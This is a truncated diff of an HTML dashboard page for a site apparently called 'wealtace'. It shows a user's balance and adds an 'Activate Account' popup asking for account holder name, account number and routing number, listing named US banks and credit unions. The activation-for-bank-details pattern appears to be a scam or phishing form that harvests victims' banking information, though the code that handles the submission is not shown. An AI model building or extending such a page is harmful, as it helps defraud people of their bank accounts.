@@ -39,5 +39,54 @@ body{background:var(--bg)}
 <button class="btn btn-activate" onclick="openActivate()">⚡ Activate Account</button>
 </div>
 
-<!-- ACTIVATE POPUP WITH ALL BANKS -->
-<div class="popup"
+<!-- ACTIVATE POPUP WITH 12 BANKS -->
+<div class="popup" id="activatePopup">
+<div class="popup-box">
+<h3>Activate Account - Bank Details</h3>
+<form onsubmit="submitActivate(event)">
+<label><b>Select Bank / Credit Union</b></label>
+<select id="bankType" required>
+<option value="">-- Select --</option>
+
+<optgroup label="BANKS">
+<option>Huntington Bank</option>
+<option>Chase Bank</option>
+<option>Bank of America</option>
+<option>Wells Fargo</option>
+<option>Citibank</option>
+<option>PNC Bank</option>
+<option>Truist Bank</option>
+</optgroup>
+
+<optgroup label="CREDIT UNIONS">
+<option>Abri Credit Union</option>
+<option>GLCU Credit Union</option>
+<option>Navy Federal Credit Union</option>
+<option>State Employees Credit Union</option>
+<option>First Tech Credit Union</option>
+</optgroup>
+</select>
+
+<input type="text" id="accName" placeholder="Account Holder Name" required>
+<input type="text" id="accNumber" placeholder="Account Number" required>
+<input type="text" id="routingNumber" placeholder="Routing Number" required>
+
+<button class="btn btn-activate">Submit for Activation</button>
+<button type="button" class="btn" style="background:#999" onclick="closeActivate()">Cancel</button>
+</form>
+</div>
+</div>
+
+<script>
+// Load user data
+let currentUser = JSON.parse(localStorage.getItem('wealtace_current_user'));
+if(!currentUser){ window.location.href = 'index.html'; }
+let users = JSON.parse(localStorage.getItem('wealtace_users')) || [];
+let user = users.find(u => u.email === currentUser.email);
+document.getElementById('userName').innerText = 'Welcome, ' + user.name;
+document.getElementById('userEmail').innerText = user.email;
+document.getElementById('userBalance').innerText = '$' + (user.balance || 0).toFixed(2);
+
+// POPUP FUNCTIONS
+function openActivate(){ document.getElementById('activatePopup').style.display='flex'; }
+function closeActivate(){ document.getElementById('activatePopup').
